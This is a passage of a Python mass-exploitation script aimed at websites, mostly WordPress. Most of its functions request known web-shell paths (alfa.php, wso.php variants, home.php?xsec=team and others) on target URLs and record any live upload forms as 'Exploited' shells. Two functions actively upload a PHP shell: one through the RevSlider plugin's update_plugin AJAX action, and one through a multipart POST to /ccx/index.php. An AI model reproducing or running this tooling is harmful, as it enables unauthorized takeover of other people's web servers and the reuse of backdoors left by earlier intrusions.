            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X213(url):
    try:
        upload_dir = url +"/alfa.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X214(url):
    try:
        upload_dir = url +"/spamshell.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X215(url):
    try:
        upload_dir = url +"/execute.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X216(url):
    try:
        upload_dir = url +"/wp-content/wso112233.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X217(url):
    try:
        upload_dir = url +"/wso112233.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X218(url):
    try:
        upload_dir = url +"/autoload_classmap.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X219(url):
    try:
        zipp = "files/TitaniumEx.zip"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data =  {'update_file':open (zipp, 'rb')}
        upload_dir = url+"/wp-content/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/admin-ajax.php"
        xex = requests.post(postdir,headers=headers,data=payload,files=data)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X220(url):
    try:
        upload_dir = url +"/home.php?xsec=team"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="upload shell"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X221(url):
    try:
        upload_dir = url +"/wp-includes/home.php?xsec=team"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="upload shell"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X222(url):
    try:
        upload_dir = url +"/wp-content/home.php?xsec=team"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="upload shell"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X223(url):
    try:
        upload_dir = url +"/wp-admin/home.php?xsec=team"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="upload shell"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X224(url):
    try:
        upload_dir = url +"/wp-content/plugins/core-stab/wso.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X225(url):
    try:
        upload_dir = url +"/wp-content/plugins/core-stab/fmanager.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" name="upload" value="Upload" style="' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X226(url):
    try:
        upload_dir = url +"/wp-content/plugins/core-stab/casper.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X227(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------797575287704659169831762525'}
        data = '-----------------------------797575287704659169831762525\r\n'
        data += 'Content-Disposition: form-data; name="btul"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------797575287704659169831762525--\r\n'
        data = data.encode("utf-8")
        urlx = url +"/ccx/index.php"
        upload_dir = url +"/ccx/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X228(url):
    try:
        upload_dir = url +"/uploads/uber_uploader_file.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X229(url):
    try:
        upload_dir = url +"/uber_uploader_file.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X230(url):
    try:
        upload_dir = url +"/wp-content/CasperEx_Security.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X231(url):
    try:
        upload_dir = url +"/vendor/phpunit/phpunit/src/Util/Log/CasperSecurity.php?f=f"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X232(url):
    try:
        upload_dir = url +"/vendor/phpunit/phpunit/src/Util/Files/Flash.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X233(url):
    try:
        upload_dir = url +"/Flash.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X234(url):
    try:
        upload_dir = url +"/wp-content/h76d3.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X235(url):
    try:
        upload_dir = url +"/wp-content/4f93s.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X236(url):
    try:
        upload_dir = url +"/class.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X237(url):
    try:
        upload_dir = url +"/wp-shell.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X238(url):
    try:
        upload_dir = url +"/wp-content/Fox.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X239(url):
    try:
